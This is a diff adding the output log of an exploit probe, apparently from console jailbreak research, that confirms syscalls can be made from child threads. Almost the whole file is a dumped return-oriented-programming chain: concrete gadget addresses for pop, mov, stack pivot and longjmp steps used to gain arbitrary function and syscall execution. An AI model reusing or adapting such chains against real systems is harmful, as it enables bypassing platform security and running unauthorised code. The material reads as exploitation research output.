@@ -1,0 +1,126 @@
+=== PROBE 128f: SYSCALL_ADDRESS IDENTITY ===
+
+pid=143
+
+[A] Address discovery
+  syscall_address = 0x830F88B57
+  eboot text = 0x0555D0000  size=0x500494000
+  sa is NOT in eboot range
+
+[B] Byte dump at sa
+  SKIPPED: sa not confirmed readable (XO risk)
+
+[C] Child syscall test: getpid via ROP + sa
+  thr_create ret=0x0000000000000000 tid=0x0000000000018CD5
+  sentinel=0xAAAAAAAAAAAAAAAA
+  child_getpid=0x000000000000008F  main_pid=143
+  *** CONFIRMED: child getpid == main pid ***
+  *** CHILD THREADS CAN MAKE SYSCALLS VIA sa ***
+
+[D] Loader syscall pipe properties
+  pipe.fn_addr = 0x0000000830F88B57
+  syscall.syscall_address = 0x0000000830F88B57
+  pipe_str: address @ 0x830f88b57
+
+ropchain @ 0x3111960f0 (size: 0x2f0)
+
+fcall_stub.fn_addr: 0x311195fd0
+fcall_stub.return_addr: 0x311195fe0
+
+0x3111960f0: 0x555d0042	; ret
+0x3111960f8: 0x555d0992	; pop rax; ret
+0x311196100: 0x311194040
+0x311196108: 0x555eeebb	; mov rax, [rax]; ret
+0x311196110: 0x55699dfe	; pop rdi; ret
+0x311196118: 0x311195fd0
+0x311196120: 0x55662c67	; mov [rdi], rax; ret
+0x311196128: 0x555d0992	; pop rax; ret
+0x311196130: 0x311196348
+0x311196138: 0x55699dfe	; pop rdi; ret
+0x311196140: 0x311195fe0
+0x311196148: 0x55662c67	; mov [rdi], rax; ret
+0x311196150: 0x555d0992	; pop rax; ret
+0x311196158: 0x3111940b0
+0x311196160: 0x555eeebb	; mov rax, [rax]; ret
+0x311196168: 0x55699dfe	; pop rdi; ret
+0x311196170: 0x311196198
+0x311196178: 0x55662c67	; mov [rdi], rax; ret
+0x311196180: 0x555d0992	; pop rax; ret
+0x311196188: 0x311198100
+0x311196190: 0x55711fc7	; pop r13; pop r14; pop r15; ret
+0x311196198: 0x0
+0x3111961a0: 0x555d0042	; ret
+0x3111961a8: 0x555d0042	; ret
+0x3111961b0: 0x55706970	; mov r9, r13; call [rax + 8]
+0x3111961b8: 0x555d0992	; pop rax; ret
+0x3111961c0: 0x55706970	; mov r9, r13; call [rax + 8]
+0x3111961c8: 0x55699dfe	; pop rdi; ret
+0x3111961d0: 0x3111961b0
+0x3111961d8: 0x55662c67	; mov [rdi], rax; ret
+0x3111961e0: 0x555d0992	; pop rax; ret
+0x3111961e8: 0x3111940a0
+0x3111961f0: 0x555eeebb	; mov rax, [rax]; ret
+0x3111961f8: 0x55699dfe	; pop rdi; ret
+0x311196200: 0x311196218
+0x311196208: 0x55662c67	; mov [rdi], rax; ret
+0x311196210: 0x555d0991	; pop r8; ret
+0x311196218: 0x0
+0x311196220: 0x555d0992	; pop rax; ret
+0x311196228: 0x311194090
+0x311196230: 0x555eeebb	; mov rax, [rax]; ret
+0x311196238: 0x55699dfe	; pop rdi; ret
+0x311196240: 0x311196258
+0x311196248: 0x55662c67	; mov [rdi], rax; ret
+0x311196250: 0x555d0e64	; pop rcx; ret
+0x311196258: 0x0
+0x311196260: 0x555d0992	; pop rax; ret
+0x311196268: 0x311194080
+0x311196270: 0x555eeebb	; mov rax, [rax]; ret
+0x311196278: 0x55699dfe	; pop rdi; ret
+0x311196280: 0x311196298
+0x311196288: 0x55662c67	; mov [rdi], rax; ret
+0x311196290: 0x559802d7	; pop rdx; ret
+0x311196298: 0x0
+0x3111962a0: 0x555d0992	; pop rax; ret
+0x3111962a8: 0x311194070
+0x3111962b0: 0x555eeebb	; mov rax, [rax]; ret
+0x3111962b8: 0x55699dfe	; pop rdi; ret
+0x3111962c0: 0x3111962d8
+0x3111962c8: 0x55662c67	; mov [rdi], rax; ret
+0x3111962d0: 0x555dd77d	; pop rsi; ret
+0x3111962d8: 0x0
+0x3111962e0: 0x555d0992	; pop rax; ret
+0x3111962e8: 0x311194060
+0x3111962f0: 0x555eeebb	; mov rax, [rax]; ret
+0x3111962f8: 0x55699dfe	; pop rdi; ret
+0x311196300: 0x311196318
+0x311196308: 0x55662c67	; mov [rdi], rax; ret
+0x311196310: 0x55699dfe	; pop rdi; ret
+0x311196318: 0x31119a500
+0x311196320: 0x555d0992	; pop rax; ret
+0x311196328: 0x311194050
+0x311196330: 0x555eeebb	; mov rax, [rax]; ret
+0x311196338: 0x555d09a2	; pop rsp; ret
+0x311196340: 0x311195fd0
+0x311196348: 0x55699dfe	; pop rdi; ret
+0x311196350: 0x311198120
+0x311196358: 0x55662c67	; mov [rdi], rax; ret
+0x311196360: 0x555d0992	; pop rax; ret
+0x311196368: 0x14110c070	; longjmp
+0x311196370: 0x55699dfe	; pop rdi; ret
+0x311196378: 0x311195fd0
+0x311196380: 0x55662c67	; mov [rdi], rax; ret
+0x311196388: 0x555d0992	; pop rax; ret
+0x311196390: 0x3111963e0
+0x311196398: 0x55699dfe	; pop rdi; ret
+0x3111963a0: 0x311195fe0
+0x3111963a8: 0x55662c67	; mov [rdi], rax; ret
+0x3111963b0: 0x55699dfe	; pop rdi; ret
+0x3111963b8: 0x311198130
+0x3111963c0: 0x555dd77d	; pop rsi; ret
+0x3111963c8: 0x0
+0x3111963d0: 0x555d09a2	; pop rsp; ret
+0x3111963d8: 0x311195fd0
+
+canary=OK
+=== 128f COMPLETE ===
